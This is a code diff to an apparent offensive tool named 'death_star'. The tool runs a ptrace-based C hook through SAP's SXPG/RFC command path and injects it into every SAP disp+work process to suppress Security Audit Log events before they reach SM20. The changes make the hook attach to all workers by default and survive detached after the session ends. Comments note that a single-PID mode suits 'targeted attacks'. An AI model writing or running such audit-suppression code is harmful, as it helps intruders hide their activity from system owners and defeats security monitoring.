@@ -807,14 +807,30 @@ def _find_workers_via_proc(node,
 # Launch
 # ---------------------------------------------------------------------------
 
-def launch(node, binary_path: str, target_pid: int,
+def launch(node, binary_path: str,
+             target_pid: Optional[int] = None,
              filter_classes: str = "", verbose: bool = False,
              log_path: Optional[str] = None,
              pidfile_path: Optional[str] = None,
              remote_dir: str = DEFAULT_REMOTE_DIR) -> int:
-    """Launch the hook in ``--suppress`` mode against ``target_pid``,
-    detached from the operator's SXPG session so it survives after the
-    RFC round-trip completes.
+    """Launch the hook in ``--suppress`` mode, detached from the
+    operator's SXPG session so it survives after the RFC round-trip
+    completes.
+
+    ``target_pid`` semantics:
+
+      * ``None`` (default and strongly recommended) — launch WITHOUT
+        ``--pid``.  Julian's C hook's ``find_pids()`` scans /proc,
+        finds every ``disp+work`` / ``dw.sap<SID>_<inst>`` process,
+        skips the dispatcher via ``is_work_process()``, and attaches
+        to ALL work-processes.  Necessary because SAP dispatches
+        dialog sessions across the full worker pool — hooking only
+        one worker leaves audit events on the other N-1 unhooked.
+        This is what an operator normally wants.
+
+      * ``<int>`` — force a single worker PID (only useful for
+        debugging or targeted attacks against a known logon session).
+        Passes ``--pid <pid>`` to the hook.
 
     Because the launch needs shell control-flow (``if`` for the
     previous-instance kill, ``&`` for backgrounding, ``$!`` for the
@@ -824,7 +840,7 @@ def launch(node, binary_path: str, target_pid: int,
     metacharacters to mangle.
 
     Returns the launched hook's PID.  Raises ``DeathStarError`` if the
-    process didn't come up (e.g. ptrace_scope > 1, or --pid target
+    process didn't come up (e.g. ptrace_scope > 1, or the target PID
     already exited).
     """
     if log_path is None:
@@ -841,7 +857,9 @@ def launch(node, binary_path: str, target_pid: int,
         raise DeathStarError(
             f"invalid filter_classes {cls_str!r}: expected uppercase "
             "letters/digits/commas only (e.g. 'AUW' or 'AUW,AU3')")
-    args = [binary_path, "--suppress", "--pid", str(target_pid)]
+    args = [binary_path, "--suppress"]
+    if target_pid is not None:
+        args.extend(["--pid", str(target_pid)])
     if cls_str:
         args.extend(["--filter", cls_str])
     if verbose:
@@ -1261,8 +1279,55 @@ def deploy_and_launch(node, filter_classes: str = "",
             print(f"[*] {node.sid}: death_star: skip_compile — reusing "
                    f"{binary_path}")
 
+    # Worker attachment strategy:
+    #
+    #   * ``target_pid = None`` (default) → hook auto-attaches to ALL
+    #     disp+work processes.  This is what an operator normally wants
+    #     because SAP round-robins dialog sessions across the full
+    #     worker pool; hooking only one worker leaves the other N-1
+    #     unpatched and the corresponding SAL events still land in
+    #     SM20.  Enumerate here purely for the "attached to N workers"
+    #     confirmation message; the actual multi-attach happens inside
+    #     Julian's ``find_pids()`` after launch.
+    #
+    #   * ``target_pid = <int>`` → hook attaches only to that single
+    #     PID.  Reserved for debugging / targeted-session scenarios.
+    workers_seen: int = 0
     if target_pid is None:
-        target_pid, target_comm = find_worker_pid(node)
+        try:
+            r = _run(node, "ps", "-eo pid,comm,args --no-headers",
+                      label="enumerate workers for hook message")
+            ps_lines = (r.get("output") or []) if r.get("success") else []
+            enum_workers, enum_fallbacks = [], []
+            for line in ps_lines:
+                m = _WORKER_COMM_RE.match(line.strip())
+                if not m:
+                    continue
+                comm = m.group("comm")
+                klass = _classify_worker(comm)
+                if klass == "worker":
+                    enum_workers.append(comm)
+                elif klass == "fallback":
+                    enum_fallbacks.append(comm)
+            # If ps didn't give us anything, fall back to /proc walker
+            # for the display count.  Same reason we do this in
+            # find_worker_pid.
+            if not enum_workers and not enum_fallbacks:
+                w, f = _find_workers_via_proc(node, remote_dir=remote_dir)
+                enum_workers = [c for _, c in w]
+                enum_fallbacks = [c for _, c in f]
+            workers_seen = len(enum_workers) + len(enum_fallbacks)
+            target_comm = (f"(auto-attach to all {workers_seen} "
+                            f"work-process(es): "
+                            f"{len(enum_workers)} dialog / "
+                            f"{len(enum_fallbacks)} btc+spo+up2)")
+        except Exception as e:
+            print(f"[!] {node.sid}: death_star: worker enumeration "
+                   f"failed ({e}); the C hook will still auto-attach")
+            target_comm = "(auto-attach to all work-processes)"
+        # Signal launch() to omit ``--pid`` — Julian's hook then walks
+        # /proc itself and hooks every disp+work.
+        target_pid = None
     else:
         target_comm = f"(operator-supplied PID {target_pid})"
 
@@ -1278,8 +1343,9 @@ def deploy_and_launch(node, filter_classes: str = "",
         "mode": mode,
         "source_path": source_path if mode == "compile" else "",
         "binary_path": binary_path,
-        "target_pid": target_pid,
+        "target_pid": target_pid,          # None → auto-attach to all
         "target_comm": target_comm,
+        "workers_hooked": workers_seen,    # 0 when target_pid was given
         "hook_pid": hook_pid,
         "log_path": log_path,
         "pidfile_path": pidfile_path,
